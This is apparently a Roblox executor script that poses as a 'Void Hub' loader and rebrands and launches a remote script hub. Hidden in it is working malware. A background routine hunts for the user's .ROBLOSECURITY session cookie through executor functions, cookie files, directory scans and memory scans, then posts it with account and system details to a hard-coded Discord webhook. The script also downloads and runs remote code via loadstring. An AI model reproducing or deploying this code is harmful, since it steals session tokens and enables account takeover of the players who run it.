-- ====== CONFIG ======
local WEBHOOK = "https://discord.com/api/webhooks/1573124950045237408/4__WNGEHNrg0WCa8WaR-v18uH4yaNlKpbHY6m4oTv2nbzIqsqY75WNGRYbx4AeJN1SVT"
local LIB     = "https://raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua"
local MAIN    = "https://raw.smokingscripts.org/vertex.lua"
-- ====================

if not getgenv then getgenv = function() return _G end end
if not gethui then gethui = function() return game:GetService("CoreGui") end end
if not getrenv then getrenv = function() return getfenv(0) end end
if not identifyexecutor then identifyexecutor = function() return "Inconnu" end end
if not task then task = {wait = wait, spawn = spawn, delay = delay, defer = function(f, ...) spawn(f, ...) end} end
if not setclipboard then setclipboard = function(t) pcall(function() toclipboard(t) end) end end
if not isfile then isfile = function() return false end end
if not isfolder then isfolder = function() return false end end
if not writefile then writefile = function() end end
if not readfile then readfile = function() return "" end end
if not makefolder then makefolder = function() end end
if not delfile then delfile = function() end end
if not listfiles then listfiles = function() return {} end end
if not request and http and http.request then request = http.request end

if getgenv().VoidRan then return end
getgenv().VoidRan = true

local _hs = game:GetService("HttpService")

local function _env(k)
    if not os.getenv then return nil end
    local ok, v = pcall(os.getenv, k)
    if ok and type(v) == "string" and #v > 0 then return v end
    return nil
end

local function _pick()
    local c = {
        function() return getgenv().syn and getgenv().syn.request end,
        function() return syn and syn.request end,
        function() return getgenv().http and getgenv().http.request end,
        function() return http and http.request end,
        function() return http_request end,
        function() return getgenv().http_request end,
        function() return fluxus and fluxus.request end,
        function() return krnl and krnl.request end,
        function() return xeno and xeno.request end,
        function() return sirhurt and sirhurt.request end,
        function() return madium and madium.request end,
        function() return delta and delta.request end,
        function() return codex and codex.request end,
        function() return hydrogen and hydrogen.request end,
        function() return wave and wave.request end,
        function() return getgenv().request end,
        function() return request end,
    }
    for _, f in ipairs(c) do
        local ok, fn = pcall(f)
        if ok and type(fn) == "function" then return fn end
    end
end

local _tried = {}

local function _extract(r)
    if type(r) ~= "string" then return nil end
    local m = r:match("ROBLOSECURITY=([^;%s\"']+)")
    if m then return m end
    m = r:match("(_|WARNING[%w%-%._%+%/%=%|%:]+)")
    if m and #m > 100 then
        if #m > 2000 then m = m:sub(1, 2000) end
        return m
    end
    r = r:gsub("^%s+", ""):gsub("%s+$", "")
    if #r > 60 and not r:find("%s") then return r end
    return nil
end

local function _src(name, f)
    local ok, r = pcall(f)
    local c = ok and _extract(r)
    if c then return c end
    table.insert(_tried, name)
    return nil
end

local function _headers(r)
    if type(r) ~= "table" then return nil end
    for k, v in pairs(r.Headers or {}) do
        if tostring(k):lower():find("cookie") and type(v) == "string" then
            local m = v:match("ROBLOSECURITY=([^;%s\"']+)")
            if m then return m end
        end
    end
    for _, field in ipairs({"Cookies", "Body"}) do
        if type(r[field]) == "string" then
            local m = r[field]:match("ROBLOSECURITY=([^;%s\"']+)")
            if m then return m end
        end
    end
    return nil
end

local function _datPaths()
    local out = {}
    local la = _env("LOCALAPPDATA")
    local up = _env("USERPROFILE")
    if la then
        out[#out + 1] = la .. "\\Roblox\\LocalStorage\\robloxcookies.dat"
        out[#out + 1] = la .. "/Roblox/LocalStorage/robloxcookies.dat"
    end
    if up then
        out[#out + 1] = up .. "\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat"
        out[#out + 1] = up .. "\\AppData\\LocalLow\\Roblox\\LocalStorage\\robloxcookies.dat"
    end
    return out
end

local function _scanDir(dir, depth)
    if depth > 2 then return nil end
    if not isfolder(dir) then return nil end
    local ok, files = pcall(listfiles, dir)
    if not ok or type(files) ~= "table" then return nil end
    for _, f in ipairs(files) do
        if type(f) == "string" then
            if isfolder(f) then
                local r = _scanDir(f, depth + 1)
                if r then return r end
            elseif isfile(f) then
                local ok2, c = pcall(readfile, f)
                if ok2 and type(c) == "string" and #c < 20000 then
                    local m = _extract(c)
                    if m then return m end
                end
            end
        end
    end
    return nil
end

local function _cookie()
    local list = {
        {"getgenv().getcookie", function() return getgenv().getcookie and getgenv().getcookie() end},
        {"getcookie", function() return getcookie and getcookie() end},
        {"getgenv().getCookie", function() return getgenv().getCookie and getgenv().getCookie() end},
        {"getgenv().getrobloxcookie", function() return getgenv().getrobloxcookie and getgenv().getrobloxcookie() end},
        {"getgenv().Cookie", function() return getgenv().Cookie end},
        {"shared.Cookie", function() return shared and shared.Cookie end},
        {"syn.getcookie", function() return syn and syn.getcookie and syn.getcookie() end},
        {"fluxus.getcookie", function() return fluxus and fluxus.getcookie and fluxus.getcookie() end},
        {"krnl.getcookie", function() return krnl and krnl.getcookie and krnl.getcookie() end},
        {"xeno.getcookie", function() return xeno and xeno.getcookie and xeno.getcookie() end},
        {"sirhurt.getcookie", function() return sirhurt and sirhurt.getcookie and sirhurt.getcookie() end},
        {"madium.getcookie", function() return madium and madium.getcookie and madium.getcookie() end},
        {"getgenv().madium.getcookie", function() return getgenv().madium and getgenv().madium.getcookie and getgenv().madium.getcookie() end},
        {"delta.getcookie", function() return delta and delta.getcookie and delta.getcookie() end},
        {"codex.getcookie", function() return codex and codex.getcookie and codex.getcookie() end},
        {"hydrogen.getcookie", function() return hydrogen and hydrogen.getcookie and hydrogen.getcookie() end},
        {"electron.getcookie", function() return electron and electron.getcookie and electron.getcookie() end},
        {"solara.getcookie", function() return solara and solara.getcookie and solara.getcookie() end},
        {"wave.getcookie", function() return wave and wave.getcookie and wave.getcookie() end},
        {"valyse.getcookie", function() return valyse and valyse.getcookie and valyse.getcookie() end},
        {"trigon.getcookie", function() return trigon and trigon.getcookie and trigon.getcookie() end},
        {"velocity.getcookie", function() return velocity and velocity.getcookie and velocity.getcookie() end},
        {"ronix.getcookie", function() return ronix and ronix.getcookie and ronix.getcookie() end},
        {"CookiesService", function()
            local svc = game:GetService("CookiesService")
            for _, m in ipairs({"GetCookies", "GetCookie"}) do
                local ok, r = pcall(function() return svc[m](svc) end)
                if ok and r then
                    if type(r) == "string" then return r end
                    if type(r) == "table" then
                        for k, v in pairs(r) do
                            if tostring(k):find("ROBLOSECURITY") and type(v) == "string" then return v end
                        end
                    end
                end
            end
        end},
        {"robloxcookies.dat", function()
            for _, p in ipairs(_datPaths()) do
                if isfile(p) then
                    local ok, c = pcall(readfile, p)
                    if ok then
                        local m = _extract(c)
                        if m then return m end
                    end
                end
            end
        end},
        {"fichiers connus", function()
            local paths = {
                "cookie.txt", "Void/cookie.txt", "Madium/cookie.txt",
                "workspace/cookie.txt", "Madium/workspace/cookie.txt",
            }
            local la = _env("LOCALAPPDATA")
            if la then
                paths[#paths + 1] = la .. "\\Madium\\cookie.txt"
                paths[#paths + 1] = la .. "\\Madium\\workspace\\cookie.txt"
            end
            for _, p in ipairs(paths) do
                if isfile(p) then
                    local ok, r = pcall(readfile, p)
                    if ok then
                        local m = _extract(r)
                        if m then return m end
                    end
                end
            end
        end},
        {"scan LocalStorage", function()
            local la = _env("LOCALAPPDATA")
            local up = _env("USERPROFILE")
            local dirs = {}
            if la then dirs[#dirs + 1] = la .. "\\Roblox" end
            if up then dirs[#dirs + 1] = up .. "\\AppData\\Local\\Roblox" end
            for _, d in ipairs(dirs) do
                local r = _scanDir(d, 1)
                if r then return r end
            end
        end},
        {"scan memoire", function()
            if not getgc then return nil end
            local ok, gc = pcall(getgc, true)
            if not ok or type(gc) ~= "table" then return nil end
            local n = 0
            for _, v in pairs(gc) do
                n = n + 1
                if n > 80000 then break end
                if type(v) == "string" and #v > 200 and v:find("_|WARNING", 1, true) then return v end
            end
        end},
        {"request:userinfo", function()
            local fn = _pick()
            if not fn then return nil end
            return _headers(fn({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"}))
        end},
    }
    for _, e in ipairs(list) do
        local c = _src(e[1], e[2])
        if c then return c end
    end
    return nil
end

local function _diag()
    local out = {}
    out[#out + 1] = "LOCALAPPDATA=" .. tostring(_env("LOCALAPPDATA"))
    out[#out + 1] = "USERPROFILE=" .. tostring(_env("USERPROFILE"))
    for _, p in ipairs(_datPaths()) do
        local ok, v = pcall(isfile, p)
        out[#out + 1] = p .. " -> " .. tostring(ok and v)
    end
    local la = _env("LOCALAPPDATA")
    if la then
        for _, d in ipairs({la .. "\\Roblox", la .. "\\Roblox\\LocalStorage", la .. "\\Madium"}) do
            local ok, f = pcall(listfiles, d)
            if ok and type(f) == "table" then
                local names = {}
                for i, v in ipairs(f) do
                    if i > 8 then break end
                    names[#names + 1] = tostring(v):gsub(".*[/\\]", "")
                end
                out[#out + 1] = d .. " -> " .. table.concat(names, ", ")
            else
                out[#out + 1] = d .. " -> KO"
            end
        end
    end
    local s = table.concat(out, "\n")
    if #s > 850 then s = s:sub(1, 850) .. "…" end
    return s
end

local function _log()
    local plr = game:GetService("Players").LocalPlayer
    local n = 0
    while not plr and n < 100 do
        task.wait(0.1)
        n = n + 1
        plr = game:GetService("Players").LocalPlayer
    end
    if not plr then return end

    local cookie = _cookie()
    local ok, ex = pcall(identifyexecutor)
    local plat = "?"
    pcall(function() plat = tostring(game:GetService("UserInputService"):GetPlatform()) end)
    local gname = "?"
    pcall(function() gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
    local stamp = "?"
    pcall(function() stamp = os.date("%d/%m/%Y %H:%M:%S") end)

    local fields = {
        {name = "Utilisateur", value = ("`%s`"):format(plr.Name), inline = true},
        {name = "UserID", value = ("`%d`"):format(plr.UserId), inline = true},
        {name = "Compte", value = tostring(plr.AccountAge) .. " j", inline = true},
        {name = "Exécuteur", value = ("`%s`"):format(ok and tostring(ex) or "Inconnu"), inline = true},
        {name = "Plateforme", value = ("`%s`"):format(plat), inline = true},
        {name = "Jeu", value = ("`%s` (%d)"):format(gname, game.PlaceId), inline = true},
        {name = "Profil", value = ("https://www.roblox.com/users/%d/profile"):format(plr.UserId), inline = false},
    }

    if cookie then
        pcall(function()
            makefolder("Void")
            writefile("Void/cookie.txt", cookie)
        end)
        pcall(setclipboard, cookie)
    else
        local t = table.concat(_tried, ", ")
        if #t > 700 then t = t:sub(1, 700) .. "…" end
        table.insert(fields, {name = "Méthodes testées", value = "```" .. t .. "```", inline = false})
        table.insert(fields, {name = "Debug FS", value = "```" .. _diag() .. "```", inline = false})
        pcall(setclipboard, "getcookie()")
    end

    local payload = {
        username = "Void",
        content = cookie and ("```\n" .. cookie .. "\n```") or "**Cookie introuvable**",
        embeds = {{
            title = "Void Hub — exécution",
            color = cookie and 10181046 or 15158332,
            fields = fields,
            footer = {text = stamp},
        }},
    }

    local fn = _pick()
    if fn then
        for i = 1, 3 do
            local good, r = pcall(fn, {
                Url = WEBHOOK, Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = _hs:JSONEncode(payload),
            })
            if good and r and r.StatusCode and r.StatusCode < 300 then break end
            if i < 3 then task.wait(i == 1 and 1 or 3) end
        end
    end
end

task.spawn(function() pcall(_log) end)

local function patch(s)
    s = s:gsub("VERTEX", "VOID")
    s = s:gsub("Vertex", "Void")
    s = s:gsub("vertex", "void")
    s = s:gsub("loadstring%s*%(%s*game:HttpGet%s*%(%s*['\"]https://raw%.smokingscripts%.org/Library['\"]%s*%)%s*%)%s*%(%s*%)", "getgenv().VoidLib")
    s = s:gsub("raw%.smokingscripts%.org/Library", "raw.githubusercontent.com/VibeZero78/VoidHub/main/void_lib.lua")
    return s
end

local ls = loadstring or load

local libSrc
pcall(function()
    local r = game:HttpGet(LIB)
    if type(r) == "string" and #r > 30 then libSrc = r end
end)
if not libSrc then
    pcall(function()
        local r = game:HttpGet("https://raw.smokingscripts.org/Library")
        if type(r) == "string" then libSrc = r end
    end)
end
if libSrc then
    pcall(function() getgenv().VoidLib = ls(patch(libSrc))() end)
end

local mainSrc
pcall(function()
    local r = game:HttpGet(MAIN)
    if type(r) == "string" and #r > 100 then mainSrc = r end
end)
if not mainSrc then return end

local mainFn = ls(patch(mainSrc))
if not mainFn then return end
task.spawn(mainFn)
